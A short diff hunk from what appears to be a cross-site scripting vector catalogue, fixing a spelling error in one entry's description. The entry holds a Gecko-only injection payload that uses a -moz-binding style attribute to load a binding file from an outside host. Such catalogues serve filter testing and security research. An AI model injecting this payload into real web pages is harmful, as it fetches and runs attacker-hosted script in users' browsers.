@@ -865,7 +865,7 @@ Author Name: ha.ckers.org
 Mozilla -moz-binding-url injection
 Exploit Name: Mozilla -moz-binding-url injection
 Exploit String:  style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
-Exploit Description: The vector incudes a binding file via injected style attrbute. Gecko only.
+Exploit Description: The vector incudes a binding file via injected style attribute. Gecko only.
 Exploit Tags: general, injection, gecko, style injection, XBL
 Author Name: .mario
 
